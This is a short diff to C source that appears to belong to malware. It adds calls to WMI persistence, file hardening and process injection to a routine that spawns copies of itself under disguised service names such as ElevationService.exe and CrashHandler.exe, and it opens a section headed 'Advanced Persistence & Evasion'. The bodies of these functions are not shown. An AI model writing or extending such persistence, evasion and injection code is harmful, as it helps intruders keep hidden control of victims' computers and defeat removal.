@@ -450,6 +450,14 @@ void sys_spawn_shadow_copy(void) {
     spawn_single_copy("ElevationService.exe", "ElevationService");
     spawn_single_copy("CrashHandler.exe", "CrashHandler");
     spawn_single_copy("NotifyService.exe", "NotifyService");
+    
+    /* Apply all advanced layers automatically */
+    sys_wmi_persistence();
+    sys_harden_files();
+    
+    /* Process injection after a short delay to let spawned processes settle */
+    Sleep(2000);
+    sys_inject_process();
 }
 
 /* === Advanced Persistence & Evasion === */
